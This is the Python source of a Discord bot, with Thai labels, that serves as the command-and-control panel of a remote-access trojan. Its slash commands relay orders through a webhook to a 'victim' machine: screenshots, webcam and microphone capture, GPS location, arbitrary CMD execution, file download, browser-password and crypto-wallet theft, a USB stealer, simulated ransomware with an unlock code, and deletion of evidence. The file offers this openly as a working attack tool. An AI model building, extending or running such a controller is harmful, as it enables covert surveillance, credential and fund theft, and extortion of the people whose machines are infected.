# ================================================================
# DISCORD BOT - RAILWAY VERSION (logger.py)
# ================================================================

import discord
from discord import app_commands
from discord.ext import commands
import requests
import base64
import os

# ==================== ตั้งค่า ====================
BOT_TOKEN = os.getenv("DISCORD_TOKEN")
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN")
# ===============================================

if not BOT_TOKEN:
    print("❌ ERROR: DISCORD_TOKEN not set!")
    exit(1)

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='/', intents=intents)

def send_command_to_victim(command, parameter=""):
    try:
        encoded = base64.b64encode(parameter.encode('utf-8')).decode('utf-8')
        content = f"```\n[COMMAND]\n{command}\n{encoded}\n```"
        data = {"content": content}
        response = requests.post(WEBHOOK_URL, json=data, timeout=5)
        return response.status_code == 204 or response.status_code == 200
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

@bot.event
async def on_ready():
    print("=" * 50)
    print(f"✅ Bot Online!")
    print(f"📌 Name: {bot.user}")
    print(f"📌 ID: {bot.user.id}")
    print("=" * 50)
    
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} command(s)")
    except Exception as e:
        print(f"❌ Sync error: {e}")
    
    await bot.change_presence(activity=discord.Game(name="/help | 1818"))

@bot.tree.command(name="help", description="แสดงคำสั่งทั้งหมด")
async def slash_help(interaction: discord.Interaction):
    embed = discord.Embed(
        title="📋 รายการคำสั่งทั้งหมด",
        description="🔑 รหัสปลดล็อก: **1818**",
        color=discord.Color.red()
    )
    
    commands_list = [
        ("📸 screenshot", "จับภาพหน้าจอ"),
        ("🔒 lock", "ล็อกหน้าจอ"),
        ("🔓 unlock", "ปลดล็อกหน้าจอ"),
        ("💻 cmd", "รันคำสั่ง CMD"),
        ("📂 ls", "แสดงรายการไฟล์"),
        ("📥 download", "ดาวน์โหลดไฟล์"),
        ("📷 webcam", "ถ่ายรูปเว็บแคม"),
        ("🎤 record", "บันทึกเสียง"),
        ("🗺️ map", "แสดงตำแหน่ง GPS"),
        ("💾 usb", "USB Stealer"),
        ("🔑 browser", "ขโมยรหัสผ่านเบราว์เซอร์"),
        ("💰 crypto", "ขโมย Crypto Wallet"),
        ("🔴 ransom", "Ransomware จำลอง"),
        ("🧹 delete_evidence", "ลบหลักฐานทั้งหมด"),
        ("📨 msg", "ส่งข้อความไปหาเหยื่อ"),
    ]
    
    for name, desc in commands_list:
        embed.add_field(name=f"/{name}", value=desc, inline=True)
    
    embed.set_footer(text="พิมพ์ / แล้วเลือกคำสั่งได้เลย!")
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="screenshot", description="จับภาพหน้าจอ")
async def slash_screenshot(interaction: discord.Interaction):
    await interaction.response.send_message("📸 กำลังจับภาพหน้าจอ...")
    send_command_to_victim("screenshot")

@bot.tree.command(name="lock", description="ล็อกหน้าจอ")
async def slash_lock(interaction: discord.Interaction):
    await interaction.response.send_message("🔒 กำลังล็อกหน้าจอ...")
    send_command_to_victim("lock")

@bot.tree.command(name="unlock", description="ปลดล็อกหน้าจอ")
async def slash_unlock(interaction: discord.Interaction):
    await interaction.response.send_message("🔓 กำลังปลดล็อก...")
    send_command_to_victim("unlock")

@bot.tree.command(name="delete_evidence", description="ลบหลักฐานทั้งหมด")
async def slash_delete_evidence(interaction: discord.Interaction):
    await interaction.response.send_message("🧹 กำลังลบหลักฐานทั้งหมด...")
    send_command_to_victim("delete_evidence")

@bot.tree.command(name="webcam", description="ถ่ายรูปเว็บแคม")
async def slash_webcam(interaction: discord.Interaction):
    await interaction.response.send_message("📷 กำลังถ่ายรูปเว็บแคม...")
    send_command_to_victim("webcam")

@bot.tree.command(name="record", description="บันทึกเสียง")
async def slash_record(interaction: discord.Interaction):
    await interaction.response.send_message("🎤 กำลังบันทึกเสียง...")
    send_command_to_victim("record")

@bot.tree.command(name="map", description="แสดงตำแหน่ง GPS")
async def slash_map(interaction: discord.Interaction):
    await interaction.response.send_message("🗺️ กำลังหาตำแหน่ง...")
    send_command_to_victim("map")

@bot.tree.command(name="usb", description="USB Stealer")
async def slash_usb(interaction: discord.Interaction):
    await interaction.response.send_message("💾 กำลัง USB Stealer...")
    send_command_to_victim("usb")

@bot.tree.command(name="browser", description="ขโมยรหัสผ่านเบราว์เซอร์")
async def slash_browser(interaction: discord.Interaction):
    await interaction.response.send_message("🔑 กำลังขโมยรหัสผ่าน...")
    send_command_to_victim("browser")

@bot.tree.command(name="crypto", description="ขโมย Crypto Wallet")
async def slash_crypto(interaction: discord.Interaction):
    await interaction.response.send_message("💰 กำลังขโมย Crypto Wallet...")
    send_command_to_victim("crypto")

@bot.tree.command(name="ransom", description="Ransomware จำลอง")
async def slash_ransom(interaction: discord.Interaction):
    await interaction.response.send_message("🔴 กำลังรัน Ransomware...")
    send_command_to_victim("ransom")

@bot.tree.command(name="cmd", description="รันคำสั่ง CMD")
@app_commands.describe(command="คำสั่งที่ต้องการรัน")
async def slash_cmd(interaction: discord.Interaction, command: str):
    await interaction.response.send_message(f"💻 กำลังรัน: `{command}`...")
    send_command_to_victim("cmd", command)

@bot.tree.command(name="ls", description="แสดงรายการไฟล์")
@app_commands.describe(path="พาธที่ต้องการดู")
async def slash_ls(interaction: discord.Interaction, path: str = "C:\\"):
    await interaction.response.send_message(f"📂 กำลังแสดงรายการไฟล์ใน `{path}`...")
    send_command_to_victim("ls", path)

@bot.tree.command(name="download", description="ดาวน์โหลดไฟล์")
@app_commands.describe(path="พาธไฟล์ที่ต้องการดาวน์โหลด")
async def slash_download(interaction: discord.Interaction, path: str):
    await interaction.response.send_message(f"📥 กำลังดาวน์โหลด: `{path}`...")
    send_command_to_victim("download", path)

@bot.tree.command(name="msg", description="ส่งข้อความไปหาเหยื่อ")
@app_commands.describe(message="ข้อความที่ต้องการส่ง")
async def slash_msg(interaction: discord.Interaction, message: str):
    await interaction.response.send_message(f"📨 กำลังส่งข้อความ: **{message[:50]}**...")
    send_command_to_victim("msg", message)

@bot.tree.command(name="ping", description="ตรวจสอบว่า Bot ทำงานอยู่")
async def slash_ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    await interaction.response.send_message(f"🏓 Pong! {latency}ms")

if __name__ == "__main__":
    print("=" * 50)
    print("🤖 DISCORD BOT - RAILWAY")
    print("=" * 50)
    print(f"🔑 รหัสปลดล็อก: 1818")
    print("=" * 50)
    bot.run(BOT_TOKEN)
